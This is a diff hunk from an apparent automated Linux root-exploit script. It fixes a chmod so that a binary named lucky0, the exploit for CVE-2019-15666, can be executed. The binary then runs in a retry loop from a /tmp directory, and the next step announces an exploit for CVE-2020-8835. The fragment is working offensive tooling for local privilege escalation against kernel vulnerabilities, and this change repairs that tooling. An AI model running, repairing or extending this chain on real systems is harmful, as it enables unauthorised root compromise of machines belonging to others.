@@ -301,7 +301,7 @@ if [ $localroot = 6 ]; then
 
     echo "[+] exploit CVE-2019-15666"
     cd /tmp/$oalahh/$CVE201915666
-    chmod x lucky0
+    chmod +x lucky0
     while :; do ./lucky0 -q && break; done
 
     echo "[+] exploit CVE-2020-8835"
